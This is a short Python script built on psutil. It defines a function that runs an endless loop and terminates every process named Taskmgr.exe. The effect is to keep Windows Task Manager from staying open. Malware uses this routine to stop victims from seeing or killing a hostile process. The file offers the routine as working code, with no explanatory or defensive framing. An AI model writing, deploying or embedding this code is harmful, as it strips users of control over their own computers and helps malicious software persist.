import psutil

def taskmgr_kill():
    while True:
        for process in psutil.process_iter(['pid', 'name']):
            try:
                if process.info['name'] != "Taskmgr.exe": continue
                process.terminate()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue